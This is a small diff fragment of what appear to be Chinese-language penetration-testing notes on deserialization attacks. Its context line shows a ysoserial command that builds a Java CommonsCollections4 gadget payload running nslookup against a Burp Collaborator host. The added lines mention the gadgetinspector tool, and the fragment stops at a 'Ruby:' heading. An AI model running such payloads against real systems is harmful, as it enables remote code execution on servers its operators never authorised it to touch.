@@ -20,4 +20,7 @@ java -jar ysoserial.jar CommonsCollections4 'nslookup burp's collaborator' | bas
 一般最好是用base64编码, -w0是为了去掉换行符
 
 
+下面这个还没有研究，不知道好不好
+https://github.com/JackOfMostTrades/gadgetinspector
+
 Ruby:
